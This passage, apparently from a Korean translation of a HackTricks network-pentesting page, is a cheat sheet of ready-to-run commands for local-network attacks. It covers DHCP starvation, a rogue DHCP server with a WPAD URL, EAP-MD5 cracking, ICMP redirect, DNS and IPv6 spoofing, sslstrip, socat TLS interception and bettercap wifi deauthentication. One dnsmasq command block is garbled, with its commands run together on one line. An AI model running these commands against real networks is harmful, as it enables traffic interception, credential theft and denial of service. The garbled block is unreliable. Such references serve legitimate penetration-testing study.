WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

DHCP 서버에 대해 수행할 수 있는 **두 가지 유형의 DoS**가 있습니다. 첫 번째는 **모든 가능한 IP 주소를 사용하는 충분한 가짜 호스트를 시뮬레이션**하는 것입니다.\
이 공격은 DHCP 서버의 응답을 볼 수 있고 프로토콜을 완료할 수 있는 경우에만 작동합니다 (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). 예를 들어, 이는 **Wifi 네트워크에서는 불가능**합니다.

DHCP DoS를 수행하는 또 다른 방법은 **모든 가능한 IP를 소스 코드로 사용하여 DHCP-RELEASE 패킷을 보내는 것**입니다. 그러면 서버는 모두가 IP를 사용을 마쳤다고 생각할 것입니다.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
더 자동화된 방법은 [DHCPing](https://github.com/kamorin/DHCPig) 도구를 사용하는 것입니다.

언급된 DoS 공격을 사용하여 클라이언트가 환경 내에서 새로운 임대를 얻도록 강제하고, 합법적인 서버를 고갈시켜 응답하지 않게 만들 수 있습니다. 따라서 합법적인 서버가 다시 연결을 시도할 때 **다음 공격에서 언급된 악의적인 값들을 제공할 수 있습니다**.

#### 악의적인 값 설정

`/usr/share/responder/DHCP.py`에 위치한 DHCP 스크립트를 사용하여 로그 DHCP 서버를 설정할 수 있습니다. 이는 악의적인 서버로 트래픽을 리디렉션하여 HTTP 트래픽 및 자격 증명을 캡처하는 것과 같은 네트워크 공격에 유용합니다. 그러나 로그 게이트웨이를 설정하는 것은 클라이언트의 아웃바운드 트래픽만 캡처할 수 있기 때문에 효과가 덜합니다. 대신, 로그 DNS 또는 WPAD 서버를 설정하는 것이 더 효과적인 공격을 위해 권장됩니다.

다음은 로그 DHCP 서버를 구성하는 명령 옵션입니다:

* **우리의 IP 주소 (게이트웨이 광고)**: `-i 10.0.0.100`을 사용하여 자신의 기기 IP를 게이트웨이로 광고합니다.
* **로컬 DNS 도메인 이름**: 선택적으로 `-d example.org`을 사용하여 로컬 DNS 도메인 이름을 설정합니다.
* **원래 라우터/게이트웨이 IP**: 합법적인 라우터 또는 게이트웨이의 IP 주소를 지정하기 위해 `-r 10.0.0.1`을 사용합니다.
* **기본 DNS 서버 IP**: 제어하는 로그 DNS 서버의 IP 주소를 설정하기 위해 `-p 10.0.0.100`을 사용합니다.
* **보조 DNS 서버 IP**: 선택적으로 `-s 10.0.0.1`을 사용하여 보조 DNS 서버 IP를 설정합니다.
* **로컬 네트워크의 넷마스크**: 로컬 네트워크의 넷마스크를 정의하기 위해 `-n 255.255.255.0`을 사용합니다.
* **DHCP 트래픽을 위한 인터페이스**: 특정 네트워크 인터페이스에서 DHCP 트래픽을 수신하기 위해 `-I eth1`을 사용합니다.
* **WPAD 구성 주소**: 웹 트래픽 가로채기를 돕는 WPAD 구성 주소를 설정하기 위해 `-w “http://10.0.0.100/wpad.dat”`을 사용합니다.
* **기본 게이트웨이 IP를 위조**: 기본 게이트웨이 IP 주소를 위조하기 위해 `-S`를 포함합니다.
* **모든 DHCP 요청에 응답**: 서버가 모든 DHCP 요청에 응답하도록 만들기 위해 `-R`을 포함합니다. 그러나 이것은 시끄럽고 감지될 수 있음을 인식하십시오.

이러한 옵션을 올바르게 사용하면 로그 DHCP 서버를 효과적으로 설정하여 네트워크 트래픽을 가로챌 수 있습니다.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP 공격**

다음은 802.1X 구현에 사용할 수 있는 공격 전술 중 일부입니다:

* EAP를 통한 적극적인 브루트포스 암호 그라인딩
* 잘못된 EAP 콘텐츠를 사용하여 RADIUS 서버 공격 _(exploits)_
* EAP 메시지 캡처 및 오프라인 암호 해독 (EAP-MD5 및 PEAP)
* TLS 인증서 유효성 검사 우회를 위해 EAP-MD5 인증을 강제
* 허브 또는 유사한 장치를 사용하여 인증 후 악의적인 네트워크 트래픽 주입

공격자가 피해자와 인증 서버 사이에 있을 경우, 필요한 경우 인증 프로토콜을 EAP-MD5로 강등시키고 인증 시도를 캡처할 수 있습니다. 그런 다음 다음을 사용하여 브루트포스 공격을 시도할 수 있습니다:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) 공격 <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol)은 **핫 리듬던시 라우팅 시스템을 생성하는** 네트워크 프로토콜 클래스입니다. FHRP를 사용하면 물리적 라우터를 하나의 논리적 장치로 결합하여 오류 허용성을 높이고 부하를 분산할 수 있습니다.

**시스코 시스템 엔지니어들은 GLBP와 HSRP 두 가지 FHRP 프로토콜을 개발했습니다.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

라우팅 정보 프로토콜(RIP)에는 RIP, RIPv2 및 RIPng 세 가지 버전이 있습니다. RIP 및 RIPv2는 UDP를 사용하여 포트 520을 통해 동료에게 데이터그램을 보내고, RIPng는 IPv6 멀티캐스트를 통해 UDP 포트 521로 데이터그램을 브로드캐스트합니다. RIPv2에서는 MD5 인증을 지원하며, RIPng에서는 네이티브 인증이 포함되어 있지 않습니다. 대신 IPv6 내에서 IPsec AH 및 ESP 헤더에 의존합니다.

* **RIP 및 RIPv2:** 통신은 포트 520의 UDP 데이터그램을 통해 이루어집니다.
* **RIPng:** IPv6 멀티캐스트를 통해 UDP 포트 521을 사용하여 데이터그램을 브로드캐스트합니다.

RIPv2는 MD5 인증을 지원하며, RIPng는 네이티브 인증이 없으며 IPv6 내에서 IPsec AH 및 ESP 헤더에 의존합니다.

### EIGRP 공격

**EIGRP (Enhanced Interior Gateway Routing Protocol)**은 동적 라우팅 프로토콜입니다. **인증이 없고 패시브 인터페이스가 구성되지 않은 경우**, **침입자**가 EIGRP 라우팅을 방해하고 **라우팅 테이블 독점**을 유발할 수 있습니다. 또한 EIGRP 네트워크(다른 말로 자율 시스템)는 **평면이며 어떠한 존으로도 분할되지 않습니다**. **공격자가 경로를 주입**하면 이 경로가 자율 시스템 전체에 **퍼질 가능성**이 높습니다.

EIGRP 시스템을 공격하려면 **합법적인 EIGRP 라우터와 이웃 관계를 설정**해야 합니다. 이는 기본적인 정찰부터 다양한 주입까지 다양한 가능성을 엽니다.

[**FRRouting**](https://frrouting.org/)을 사용하면 **BGP, OSPF, EIGRP, RIP 및 기타 프로토콜을 지원하는 가상 라우터를 구현**할 수 있습니다. 공격자 시스템에 배포하면 라우팅 도메인에서 합법적인 라우터인 척할 수 있습니다.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/)는 EIGRP (Enhanced Interior Gateway Routing Protocol) 브로드캐스트를 가로채는 기능을 제공합니다. 패킷 주입도 가능하며, 이를 통해 라우팅 구성을 변경할 수 있습니다.

### OSPF

Open Shortest Path First (OSPF) 프로토콜에서는 **MD5 인증이 일반적으로 사용**되어 라우터 간 안전한 통신을 보장합니다. 그러나 Loki 및 John the Ripper와 같은 도구를 사용하여 이러한 보안 조치를 우회할 수 있습니다. 이 도구들은 MD5 해시를 캡처하고 해독하여 인증 키를 노출시킬 수 있습니다. 이 키를 획득하면 새로운 라우팅 정보를 도입할 수 있습니다. 라우트 매개변수를 구성하고 침해당한 키를 설정하려면 각각 _Injection_ 및 _Connection_ 탭을 사용합니다.

* **MD5 해시 캡처 및 해독:** Loki 및 John the Ripper와 같은 도구를 사용합니다.
* **라우트 매개변수 구성:** _Injection_ 탭을 통해 수행됩니다.
* **침해당한 키 설정:** 키는 _Connection_ 탭에서 구성됩니다.

### 기타 일반 도구 및 소스

* [**Above**](https://github.com/c4s73r/Above): 네트워크 트래픽을 스캔하고 취약점을 찾는 도구
* 네트워크 공격에 대한 **추가 정보**는 [**여기**](https://github.com/Sab0tag3d/MITM-cheatsheet)에서 찾을 수 있습니다.

## **스푸핑**

공격자는 가짜 DHCP 응답을 보내어 네트워크의 새로운 구성원의 모든 네트워크 매개변수(GW, IP, DNS)를 구성합니다.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP 스푸핑

[이전 섹션](./#arp-spoofing)을 확인하십시오.

### ICMPRedirect

ICMP 리다이렉트는 ICMP 패킷 유형 1 코드 5를 보내어 공격자가 IP에 도달하는 가장 좋은 방법임을 나타냅니다. 그런 다음 피해자가 IP에 연락하려고 할 때 패킷을 공격자를 통해 보내게 됩니다.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS 스푸핑

공격자는 피해자가 요청하는 도메인 중 일부(또는 모두)를 해석(resolve)할 것입니다.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**dnsmasq를 사용하여 자체 DNS 구성**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### 로컬 게이트웨이

시스템 및 네트워크로의 여러 경로가 종종 존재합니다. 로컬 네트워크 내의 MAC 주소 목록을 작성한 후 _gateway-finder.py_를 사용하여 IPv4 포워딩을 지원하는 호스트를 식별합니다.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [LLMNR, NBT-NS 및 mDNS 스푸핑](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

DNS 조회가 실패할 때 로컬 호스트 해상도를 위해 Microsoft 시스템은 **Link-Local Multicast Name Resolution (LLMNR)** 및 **NetBIOS Name Service (NBT-NS)**에 의존합니다. 비슷하게, **Apple Bonjour** 및 **Linux zero-configuration** 구현은 네트워크 내 시스템을 발견하기 위해 **Multicast DNS (mDNS)**를 활용합니다. 이러한 프로토콜들의 인증되지 않은 성격과 UDP를 통해 작동하며 메시지를 브로드캐스팅하기 때문에, 악의적인 서비스로 사용자를 리디렉션하려는 공격자들에 의해 악용될 수 있습니다.

Responder를 사용하여 호스트가 검색하는 서비스를 흉내낼 수 있습니다.\
[Responder를 사용하여 서비스를 흉내내는 방법에 대한 자세한 정보는 여기를 참조하십시오](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [WPAD 스푸핑](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

브라우저는 일반적으로 **Web Proxy Auto-Discovery (WPAD) 프로토콜을 사용하여 프록시 설정을 자동으로 획득**합니다. 이는 특정 URL을 통해 서버로부터 구성 세부 정보를 가져오는 것을 포함합니다. 클라이언트가 이 서버를 발견하는 방법은 다음과 같습니다:

* **DHCP**를 통해, 발견은 특별한 코드 252 항목을 활용하여 용이하게 이루어집니다.
* **DNS**를 통해, 로컬 도메인 내에서 _wpad_로 레이블이 지정된 호스트 이름을 검색하는 것을 포함합니다.
* **Microsoft LLMNR 및 NBT-NS**를 통해, DNS 조회가 성공하지 않은 경우에 사용되는 대체 메커니즘입니다.

Responder 도구는 악의적인 **WPAD 서버**로 작동하여 이 프로토콜을 악용합니다. DHCP, DNS, LLMNR 및 NBT-NS를 사용하여 클라이언트가 연결하도록 속이는 것입니다. Responder를 사용하여 서비스를 흉내내는 방법에 대해 자세히 알아보려면 [여기를 확인하십시오](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [SSDP 및 UPnP 장치 스푸핑](spoofing-ssdp-and-upnp-devices.md)

네트워크에서 다른 서비스를 제공하여 사용자를 속여 **일반 텍스트 자격 증명**을 입력하도록 유도할 수 있습니다. **이 공격에 대한 자세한 정보는** [**SSDP 및 UPnP 장치 스푸핑**](spoofing-ssdp-and-upnp-devices.md)**에서 확인하십시오.**

### IPv6 이웃 스푸핑

이 공격은 ARP 스푸핑과 매우 유사하지만 IPv6 환경에서 발생합니다. 피해자가 공격자의 MAC 주소를 가진 GW의 IPv6를 가지고 있다고 생각하게 할 수 있습니다.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 라우터 광고 스푸핑/플러딩

일부 OS는 네트워크에 전송된 RA 패킷에서 기본적으로 게이트웨이를 구성합니다. 공격자를 IPv6 라우터로 선언하려면 다음을 사용할 수 있습니다:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

기본적으로 일부 OS는 네트워크에서 DHCPv6 패킷을 읽어 DNS를 구성하려고 시도합니다. 그런 다음, 공격자는 자신을 DNS로 구성하기 위해 DHCPv6 패킷을 보낼 수 있습니다. DHCP는 피해자에게도 IPv6를 제공합니다.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (가짜 페이지 및 JS 코드 삽입)

## 인터넷 공격

### sslStrip

이 공격이 하는 것은, 사용자가 HTTPS 버전으로 리디렉팅되는 HTTP 페이지에 액세스하려고 시도할 때, sslStrip이 클라이언트와 서버 간에 HTTP 연결과 HTTPS 연결을 유지하여 연결을 평문으로 가로챌 수 있도록 하는 것입니다.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
더 많은 정보는 [여기](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf)에서 확인할 수 있습니다.

### HSTS 우회를 위한 sslStrip+ 및 dns2proxy

**sslStrip+와 dns2proxy**가 **sslStrip**와 **다른 점**은 예를 들어 _**www.facebook.com**_을 _**wwww.facebook.com**_으로 **리다이렉트**하고 이 도메인의 **주소를 공격자 IP로 설정**한다는 것입니다. 이렇게 하면 **클라이언트**가 _**wwww.facebook.com**_ (공격자)에 **연결**하지만 **sslstrip+**는 **실제 연결**을 유지하면서 **www.facebook.com**으로 https를 통해 연결합니다.

이 기술의 **목표**는 _**wwww**.facebook.com_이 브라우저의 **캐시에 저장되지 않기** 때문에 브라우저가 **HTTP에서 facebook 인증을 수행하도록 속이는 것**입니다.\
이 공격을 수행하려면 피해자가 처음에 [http://www.faceook.com](http://www.faceook.com)에 액세스하려고 시도해야 합니다. 이는 http 페이지 내의 링크를 수정하여 수행할 수 있습니다.

더 많은 정보는 [여기](https://www.bettercap.org/legacy/#hsts-bypass), [여기](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) 및 [여기](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly)에서 확인할 수 있습니다.

**sslStrip 또는 sslStrip+는 더 이상 작동하지 않습니다. 이는 브라우저에 미리 저장된 HSTS 규칙이 있기 때문에 사용자가 "중요한" 도메인에 처음 액세스하더라도 HTTPS를 통해 액세스할 것입니다. 또한, 미리 저장된 규칙 및 다른 생성된 규칙이** [**`includeSubdomains`**](https://hstspreload.appspot.com) **플래그를 사용할 수 있으므로 앞에서 언급한 _**wwww.facebook.com**_ 예제는 더 이상 작동하지 않을 것입니다.** _**facebook.com**_ **은 `includeSubdomains`를 사용하여 HSTS를 사용합니다.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP 포트에서 수신하기
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL 포트에서 수신

#### 키 및 자체 서명된 인증서 생성
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### 인증서를 사용하여 수신하기
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### 인증서를 사용하여 호스트로 리다이렉트하기
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
가끔, 클라이언트가 CA가 유효한지 확인하면 **CA가 서명한 다른 호스트 이름의 인증서를 제공**할 수 있습니다.\
또 다른 흥미로운 테스트는 요청된 호스트 이름의 c**ertificate를 제공하지만 self-signed**하는 것입니다.

다른 테스트할 사항으로는 유효한 CA가 아닌 유효한 인증서로 인증서에 서명을 시도해보거나, 유효한 공개 키를 사용하여 실제 개인 키로 아무것도 해독할 필요가 없는 diffie hellman과 같은 알고리즘을 강제로 사용하고 클라이언트가 실제 개인 키의 프로브(해시와 같은)를 요청할 때 가짜 프로브를 보내고 클라이언트가 이를 확인하지 않도록 기대할 수 있습니다.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### 활성 탐지 노트

UDP 패킷이 요청된 포트를 가지고 있지 않은 장치로 전송될 때 ICMP (포트 도달 불가)가 전송된다는 점을 고려하십시오.

### **ARP 발견**

ARP 패킷은 네트워크 내에서 사용되는 IP 주소를 발견하는 데 사용됩니다. PC는 각 가능한 IP 주소에 대한 요청을 보내고 사용 중인 것만 응답합니다.

### **mDNS (멀티캐스트 DNS)**

Bettercap은 **\_services\_.dns-sd.\_udp.local**를 요청하는 MDNS 요청을 보냅니다 (매 X 밀리초마다). 이 패킷을 보는 기기는 일반적으로 이 요청에 응답합니다. 그런 다음 "services"에 응답하는 기기만 검색합니다.

**도구**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercap은 "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA"라는 이름을 요청하기 위해 137/UDP 포트로 패킷을 브로드캐스트합니다.

### **SSDP (간단한 서비스 검색 프로토콜)**

Bettercap은 모든 종류의 서비스를 검색하기 위해 SSDP 패킷을 브로드캐스트합니다 (UDP 포트 1900).

### **WSD (웹 서비스 검색)**

Bettercap은 서비스를 검색하기 위해 WSD 패킷을 브로드캐스트합니다 (UDP 포트 3702).

## 참고 자료

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **네트워크 보안 평가: 네트워크 파악하기 (3판)**
* **실용적인 IoT 해킹: 사물 인터넷 공격의 확정 가이드. Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood 저**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**버그 바운티 팁**: **Intigriti**에 **가입**하여 **해커들이 만든 프리미엄 버그 바운티 플랫폼** **Intigriti**에 참여하세요! [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 오늘부터 최대 **$100,000**의 바운티를 받아보세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**로부터 **제로**에서 **히어로**까지 **AWS 해킹 배우기**</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 PDF로 다운로드하려면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 얻으세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>
